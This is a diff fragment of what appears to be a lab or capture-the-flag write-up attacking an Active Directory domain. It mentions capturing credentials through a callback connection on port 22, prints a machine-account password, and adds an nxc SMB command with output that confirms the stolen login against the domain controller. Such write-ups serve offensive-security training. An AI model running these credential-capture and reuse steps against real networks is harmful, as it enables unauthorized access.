@@ -758,3 +758,12 @@ Ill send a connection back to myself on port 22 and get the credentials
 ```python
 itops01$:paSSword2459
 ```
+
+```python
+nxc smb dc.hsm-defense.local -u 'itops01$' -p 'paSSword2459' -k                        
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\itops01$:paSSword2459
+```
+
+This account is compromised!
+
